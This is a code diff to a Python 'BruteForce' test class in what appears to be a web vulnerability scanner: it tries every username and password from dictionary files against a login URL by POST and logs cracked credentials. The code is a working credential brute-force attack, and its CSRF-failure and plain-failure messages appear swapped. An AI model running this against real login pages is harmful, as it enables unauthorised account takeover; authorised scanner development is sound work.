@@ -1,7 +1,7 @@
 import concurrent.futures
+import time
 
 from Tests.Test import Test
-from mQtWrapper.pdfGen import PdfGen
 import requests
 
 
@@ -9,19 +9,18 @@ class BruteForce(Test):
     usernames = None
     passwords = None
 
-    def __init__(self, name):
+    def __init__(self):
+        super().__init__()
         self.cancel = False
         with open(r"dictionaries\usernames.txt", "r") as usernames:
             self.usernames = [*usernames]
         with open(r"dictionaries\passwords.txt", "r") as passwords:
             self.passwords = [*passwords]
-        self.results = ""
-        self.name = name
+        self.name = "Brute Force"
         self.future = None
 
-    def run(self, url: str, pdf: PdfGen):
+    def run(self, url: str):
         self.cancel = False
-        pdf.addP(f"url: {url}")
         print("A")
         with concurrent.futures.ThreadPoolExecutor() as executor:
             self.future = executor.submit(self.bruteCracking, url)
@@ -37,10 +36,11 @@ class BruteForce(Test):
             user_count = user_count + 1
             for password in self.passwords:
                 if self.cancel:
+                    self.cancel_result(url, user_count, count)
                     return
                 password = password.strip()
                 count = count + 1
-                print(f'''Trying user ({user_count}/{user_len}): {username}\nTrying password ({count}/{pass_len}): {password}''')
+                print(f'''Trying user ({user_count}/{user_len}): {username}''', f'''Trying password ({count}/{pass_len}): {password}''')
                 data_dict = {"email": username, "password": password}
                 try:
                     response = requests.post(url, data=data_dict)
@@ -54,7 +54,8 @@ class BruteForce(Test):
                     continue
                 elif "csrf" in str(response.content).lower():
                     print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
-                    exit()
+                    self.csrf_failure(url)
+                    return
                 elif response.status_code != 200:
                     print("Username: ---> " + username)
                     print("Password: ---> " + password)
@@ -64,5 +65,32 @@ class BruteForce(Test):
                     print("Password: ---> " + password)
                     print("CORRECT")
                     print("This Site is vulnerable against the BruteForce attack!")
-                    break
+                    self.success(username, password, url)
+                    return
+        self.failure(url)
+
+    def csrf_failure(self, url):
+        result = f'''Brute force scanning done for page {url}\n''' \
+                 '''Was a failure'''
+        self.results.append((time.time(), result))
+
+    def failure(self, url):
+        result = f'''Brute force scanning done for page {url}\n''' \
+                 '''Was stopped due to CSRF Token Detected!!\n'''\
+                 '''BruteF0rce Not Working This Website'''
+        self.results.append((time.time(), result))
+
+    def success(self, username, password, url):
+        result = f'''Brute force scanning done for page {url}\n'''\
+                '''Was a success for credentials:\n'''\
+                f'''Username: {username}\n'''\
+                f'''Password: {password}'''
+        self.results.append((time.time(), result))
+
+    def cancel_result(self, url, user_count, count):
+        result = f'''Brute force scan for page {url}\n'''\
+                '''Was canceled\n'''\
+                f'''Users fully checked: {user_count-1}/{len(self.usernames)}\n'''\
+                f'''Password checked for user num {user_count}: {count}/{len(self.passwords)}'''
+        self.results.append((time.time(), result))
 
